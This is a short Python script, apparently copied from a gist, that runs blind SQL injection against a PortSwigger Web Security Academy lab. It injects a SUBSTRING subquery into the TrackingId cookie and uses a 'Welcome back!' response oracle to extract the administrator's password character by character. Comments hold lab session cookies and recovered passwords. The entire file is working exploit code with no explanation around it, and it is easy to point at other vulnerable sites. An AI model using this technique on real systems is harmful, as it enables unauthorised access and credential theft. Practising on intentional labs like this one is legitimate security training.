
# Source was from
#https://gist.githubusercontent.com/fahmifj/1cc3e3e67362edb8ffcd093a1bf54189/raw/69aa0a58118058c6d39a136cbb0db0bbb463af1e/blind-sql.py
import requests, string, sys, warnings, time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

warnings.simplefilter('ignore', InsecureRequestWarning)

req = requests.Session()
url = "https://0a75002804a20d16848650000019003d.web-security-academy.net/filter?category=Pets"
hint = "Welcome back!"

# Cookie: TrackingId=h2dGFtb9XTYwq4zk; session=6hkZoumrQhrU9o4i03CQxdXkDpyTiePP
password = ""  # ag2yj74y5ng8k1uvbxni // length 21
# kthtccl0eonf2ki7z3ew
index = 1
password_length = 20

# For debugging
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}
while True:
    if index > password_length:
        print("\n Finished at index = ", index)
        break
    for char in string.ascii_letters + string.digits:  # a-z,A-Z,0-9
        sys.stdout.write(f"\r[+] Password: {password}{char}")
        cookies = {
            "session": "6hkZoumrQhrU9o4i03CQxdXkDpyTiePP",
            "TrackingId": f"h2dGFtb9XTYwq4zk' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),{index},1) = '{char}",
        }
        resp = requests.get(url, cookies=cookies, proxies=proxies, verify=False)
        if hint in resp.text:
            password = password + char
            index = index + 1
